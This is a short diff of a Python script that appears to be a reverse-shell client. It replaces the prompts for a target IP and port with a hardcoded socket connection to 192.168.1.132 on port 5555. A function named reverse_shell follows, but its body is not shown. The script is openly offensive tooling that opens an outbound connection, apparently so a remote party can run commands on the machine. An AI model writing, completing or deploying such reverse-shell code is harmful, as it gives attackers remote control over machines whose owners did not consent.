@@ -4,12 +4,12 @@ import subprocess
 import socket
 import os
 
-target = raw_input("What is the target IP: ")
-port = int(raw_input("What is the port number: "))
+#target = raw_input("What is the target IP: ")
+#port = int(raw_input("What is the port number: "))
 
 
 client = socket.socket()
-client.connect((target,port))
+client.connect(("192.168.1.132",5555))
 
 
 def reverse_shell(command):
